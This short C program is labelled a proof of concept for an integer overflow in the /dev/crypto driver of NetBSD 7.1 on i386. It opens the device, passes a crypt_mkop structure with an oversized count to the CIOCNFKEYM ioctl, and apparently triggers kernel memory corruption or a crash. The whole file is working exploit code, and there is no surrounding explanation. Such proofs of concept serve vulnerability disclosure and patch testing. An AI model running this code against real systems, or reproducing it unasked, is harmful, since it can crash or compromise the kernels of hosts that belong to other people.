/*
 * NetBSD-i386 7.1 /dev/crypto int overflow PoC. 
 */

#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <crypto/cryptodev.h>
#include <fcntl.h>

int main (int argc, char **argv) {
	int fd = open("/dev/crypto", O_RDWR);

	if (fd == -1) {
		printf("open(/dev/crypto) failed\n");
		exit(0);
	}

	struct crypt_mkop *mkop = malloc(sizeof(struct crypt_mkop));
	if (!mkop) {
		printf("malloc failed\n");
		exit(0);
	}

	char *ptr = malloc(100000);
	mkop->count = 51130564 + 50;
	mkop->reqs = ptr;
	int r = ioctl(fd, CIOCNFKEYM, mkop);
}
